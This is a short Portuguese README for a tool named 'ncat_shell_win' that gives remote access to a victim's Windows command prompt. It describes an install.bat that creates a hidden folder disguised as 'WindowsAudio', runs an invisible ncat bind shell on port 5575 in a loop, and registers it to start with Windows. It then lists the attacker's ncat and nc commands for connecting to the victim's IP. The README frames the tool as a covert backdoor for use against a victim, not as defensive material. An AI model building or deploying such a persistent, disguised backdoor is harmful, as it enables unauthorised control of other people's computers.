# ncat_shell_win
Ganhar acesso ao CMD do Windows via NCAT (Bind Shell)

## Requisitos
- Instalar o Nmap (que inclui o ncat):
  https://nmap.org/dist/nmap-7.99-setup.exe

## O que o install.bat faz
| Ação         | Descrição |
|--------------|-----------|
| Pasta oculta | Cria `C:\Users\Usuario\WindowsAudio\` (atributo +h) |
| audio.vbs    | Loop infinito com ncat invisível na porta **5575** |
| audio.bat    | Executa o .vbs e fecha |
| Registro     | Inicia junto com Windows (nome: `WindowsAudio`) |
| Listener     | Já sobe na hora |

## Como usar

### 1. Na vítima (Windows)
Execute o `install.bat`

### 2. No atacante
```bash
# Windows (via ncat)
ncat IP_DA_VITIMA 5575

# Linux (via nc ou ncat)
nc IP_DA_VITIMA 5575
ncat IP_DA_VITIMA 5575
